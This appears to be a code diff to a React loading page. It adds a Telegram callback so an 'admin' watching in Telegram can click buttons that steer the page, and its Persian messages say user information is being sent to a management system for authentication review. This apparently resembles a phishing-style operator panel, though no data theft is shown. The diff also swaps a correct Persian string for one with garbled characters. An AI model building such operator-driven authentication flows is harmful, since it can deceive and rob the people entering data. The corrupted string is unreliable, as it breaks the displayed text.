@@ -34,6 +34,12 @@ const Loading = () => {
         const session = getSession(sessionId);
         setSessionData(session);
 
+        // Register callback handler for admin button clicks
+        registerTelegramCallback(sessionId, (action) => {
+          console.log("🎯 Admin clicked:", action);
+          handleAdminAction(action);
+        });
+
         // Show loading for 2 seconds
         setTimeout(async () => {
           setIsLoading(false);
@@ -49,6 +55,13 @@ const Loading = () => {
     };
 
     initializeLoading();
+
+    // Cleanup callback registration when component unmounts
+    return () => {
+      if (sessionId) {
+        unregisterTelegramCallback(sessionId);
+      }
+    };
   }, [sessionId, navigate]);
 
   // Check for admin actions every 5 seconds
@@ -370,7 +383,7 @@ const Loading = () => {
           >
             🤖{" "}
             {isLoading
-              ? "در حال ارسال اطلاعات به سیستم مدیریت..."
+              ? "در حال ارس��ل اطلاعات به سیستم مدیریت..."
               : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
           </p>
         </div>
